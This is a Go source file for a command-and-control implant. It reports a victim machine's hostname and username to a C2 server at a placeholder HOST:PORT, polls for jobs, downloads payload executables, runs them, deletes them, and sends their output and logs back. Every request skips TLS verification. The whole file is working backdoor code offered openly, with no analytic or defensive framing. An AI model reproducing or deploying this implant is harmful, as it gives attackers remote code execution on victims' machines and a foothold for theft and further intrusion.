package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/rs/zerolog"

	"github.com/google/uuid"
)

var AuthorizationToken string
var AuthorizationTokenExpire string
var JobsQueue []string

var connectionErr = fmt.Errorf("can't connect to a C2")
var marshalErr = fmt.Errorf("can't marshal a data for json")
var requestCreationErr = fmt.Errorf("can't create a new request")
var requestSendingErr = fmt.Errorf("can't perform a request")
var responseReadingErr = fmt.Errorf("can't do io.ReadAll")
var unmarshalErr = fmt.Errorf("can't unmarshal a JSON in response")
var credentialsErr = fmt.Errorf("can't login with this credentials:")
var hostnameErr = fmt.Errorf("can't get hostname of a victim")
var usernameErr = fmt.Errorf("can't get a username on a victim")
var noJobsErr = fmt.Errorf("no jobs to run")
var fileCreationErr = fmt.Errorf("can't create a file")
var fileWritingErr = fmt.Errorf("can't write to a file")
var payloadExecutionErr = fmt.Errorf("payload execution was unsuccessful")
var fileDeletionErr = fmt.Errorf("can't delete a file wit payload")
var LogBuffer bytes.Buffer
var Logger = zerolog.New(&LogBuffer).With().Timestamp().Logger()

func AGENT() {
	JobsQueue = make([]string, 0)
	for {
		for {
			err := CHECKCONNECTION()
			if !errors.Is(err, connectionErr) {
				break
			} else {
				time.Sleep(time.Second * 7)
			}
		}
		for {
			err := TRYTOCONNECT()
			if errors.Is(err, nil) {
				break
			} else {
				time.Sleep(time.Second * 5)
			}
		}
		for {
			err := CHECKJOBS()
			if errors.Is(err, nil) {
				jobsStatus, jobsOut := DOJOBS()
				UPDATEJOBSTATUS(jobsStatus, jobsOut)

			} else if errors.Is(err, requestSendingErr) {
				break
			} else {
				time.Sleep(time.Second * 3)
			}
			SENDLOGS()
		}

	}
}

func CHECKCONNECTION() error {
	conn, err := net.Dial("tcp", "HOST:PORT")
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "connecting to C2").Msg(connectionErr.Error())
		return connectionErr
	}
	defer conn.Close()
	Logger.Info().Str("status", "success").Str("stage", "connecting to C2").Msg("Successfully connected to C2")
	return nil
}

func TRYTOCONNECT() error {
	id := uuid.New()
	uuid := id.String()
	hostname, err := GETMACHINENAME()
	if err != nil {
		return err
	}
	username, err := GETUSERNAME()
	if err != nil {
		return err
	}
	connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
	connectPostJson, err := json.Marshal(connectPostBody)
	if err != nil {
		return marshalErr
	}
	req, err := http.NewRequest("POST", "https://HOST:PORT/connect", bytes.NewBuffer(connectPostJson))
	if err != nil {
		return requestCreationErr
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return requestSendingErr
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return responseReadingErr
	}
	var respJson struct {
		Code   int    `json:"code"`
		Expire string `json:"expire"`
		Token  string `json:"token"`
	}
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		return unmarshalErr
	}
	if respJson.Code == 200 {
		AuthorizationToken = respJson.Token
		AuthorizationTokenExpire = respJson.Expire
		return nil
	} else {
		return credentialsErr
	}
}

func GETMACHINENAME() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "getting hostname").Msg(hostnameErr.Error())
		return "", hostnameErr
	}
	Logger.Info().Str("status", "success").Str("stage", "getting hostname").Msg("Successfully got a hostname")
	return hostname, nil
}

func GETUSERNAME() (string, error) {
	user, err := user.Current()
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "getting username").Msg(usernameErr.Error())
		return "", usernameErr
	}
	Logger.Info().Str("status", "success").Str("stage", "getting username").Msg("Successfully got a username")
	return user.Username, nil
}

func CHECKJOBS() error {
	req, err := http.NewRequest("GET", "https://HOST:PORT/agent/jobs", nil)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(requestCreationErr.Error())
		return requestCreationErr
	}
	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(requestSendingErr.Error())
		return requestSendingErr
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(responseReadingErr.Error())
		return responseReadingErr
	}
	var respJson []string
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", "checking jobs").Msg(unmarshalErr.Error())
		return unmarshalErr
	}
	if len(respJson) == 0 {
		return noJobsErr
	} else {
		JobsQueue = append(JobsQueue, respJson...)
		Logger.Info().Str("status", "success").Str("stage", "checking jobs").Msg(fmt.Sprintf("Jobs were added: %v", respJson))
		return nil
	}
}

func DOJOBS() (map[string]bool, map[string]string) {
	jobsStatus := make(map[string]bool)
	jobsOut := make(map[string]string)
	for _, jobUuid := range JobsQueue {
		req, err := http.NewRequest("GET", "https://HOST:PORT/agent/jobs/"+jobUuid+"/payload/", nil)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(requestCreationErr.Error())
			jobsStatus[jobUuid] = false
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(requestSendingErr.Error())
			jobsStatus[jobUuid] = false
		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(responseReadingErr.Error())
			jobsStatus[jobUuid] = false
		}
		payloadFilename := jobUuid + ".exe"
		err = WRITETOFILE(payloadFilename, string(respBody))
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(err.Error())
			jobsStatus[jobUuid] = false
		}
		jobOut, err := RUNJOB(payloadFilename)
		if !errors.Is(err, payloadExecutionErr) {
			if len(jobOut) == 0 {
				jobsOut[jobUuid] = "Job hasn't returned some output. But it seems ok."
			} else {
				jobsOut[jobUuid] = string(jobOut)
			}
			jobsStatus[jobUuid] = true
			Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg("Successfully executed the job")
		} else {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("executing jobs - %s", jobUuid)).Msg(err.Error())
			jobsStatus[jobUuid] = false
			jobsOut[jobUuid] = fmt.Sprintf("Job was executed with error: %v", err)
		}
	}
	JobsQueue = []string{}
	return jobsStatus, jobsOut
}

func WRITETOFILE(filename string, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fileCreationErr
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return fileWritingErr
	}
	return file.Sync()
}

func RUNJOB(payloadFilename string) ([]byte, error) {
	payloadResults, err := exec.Command(".\\"+payloadFilename, "").Output()
	if err != nil {
		return nil, payloadExecutionErr
	}
	Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("running job - %s", payloadFilename)).Msg("Successfully executed the payload")
	err = os.Remove(payloadFilename)
	if err != nil {
		return nil, fileDeletionErr
	}
	Logger.Info().Str("status", "success").Str("stage", fmt.Sprintf("running job - %s", payloadFilename)).Msg("Successfully removed the payload")
	return payloadResults, nil
}

func UPDATEJOBSTATUS(jobsStatus map[string]bool, jobsOut map[string]string) {
	for jobUuid, jobStatus := range jobsStatus {
		var updateJobStatusBody struct {
			JobUuid string `json:"job-uuid"`
			Status  bool   `json:"status"`
			Result  string `json:"job-result"`
		}
		updateJobStatusBody.JobUuid = jobUuid
		updateJobStatusBody.Status = jobStatus
		updateJobStatusBody.Result = jobsOut[jobUuid]
		updateJobStatusJson, err := json.Marshal(updateJobStatusBody)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(unmarshalErr.Error())
		}
		req, err := http.NewRequest("POST", "https://HOST:PORT/agent/jobs/update", bytes.NewBuffer(updateJobStatusJson))
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(requestCreationErr.Error())
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		req.Header.Set("Content-Type", "application/json")
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(requestSendingErr.Error())
		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(responseReadingErr.Error())
		}
		var respJson struct {
			Status string `json:"status"`
		}
		err = json.Unmarshal(respBody, &respJson)
		if err != nil {
			Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("updating job status - %s", jobUuid)).Msg(unmarshalErr.Error())
		}
	}
}

func SENDLOGS() {
	type LogEntry struct {
		Level   string `json:"level"`
		Status  string `json:"status"`
		Stage   string `json:"stage"`
		Time    string `json:"time"`
		Message string `json:"message"`
	}
	var logRequestBody []LogEntry
	var tempLogEntry LogEntry
	logs := LogBuffer.String()
	logLines := strings.Split(logs, "\n")
	for _, logLine := range logLines {
		if logLine != "" {
			err := json.Unmarshal([]byte(logLine), &tempLogEntry)
			if err != nil {
				Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
			}
			logRequestBody = append(logRequestBody, tempLogEntry)
		}
	}
	logRequestJson, err := json.Marshal(logRequestBody)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(marshalErr.Error())
	}
	req, err := http.NewRequest("POST", "https://HOST:PORT/agent/logs/add", bytes.NewBuffer(logRequestJson))
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestCreationErr.Error())
	}
	req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(requestSendingErr.Error())
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(responseReadingErr.Error())
	}
	var respJson struct {
		Status string `json:"status"`
	}
	err = json.Unmarshal(respBody, &respJson)
	if err != nil {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg(unmarshalErr.Error())
	}
	if respJson.Status != "ok" {
		Logger.Info().Str("status", "error").Str("stage", fmt.Sprintf("sending logs")).Msg("Something wrong with a logging")
	}
	LogBuffer.Reset()
}

func main() {
	AGENT()
}
